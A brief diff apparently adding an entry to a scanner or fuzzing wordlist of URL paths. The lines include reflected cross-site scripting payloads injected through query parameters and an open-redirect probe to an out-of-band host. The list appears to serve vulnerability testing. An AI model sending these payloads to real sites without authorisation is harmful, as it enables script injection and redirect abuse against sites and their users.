@@ -21,3 +21,4 @@
 /help/top.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E
 /%2f%5c%2foast.pro%2f..
 /api/v1/getbaseconfig
+/?ru&filter=%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
